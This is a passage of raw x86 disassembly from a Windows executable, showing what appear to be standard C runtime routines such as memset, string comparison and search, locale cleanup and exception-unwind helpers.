  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
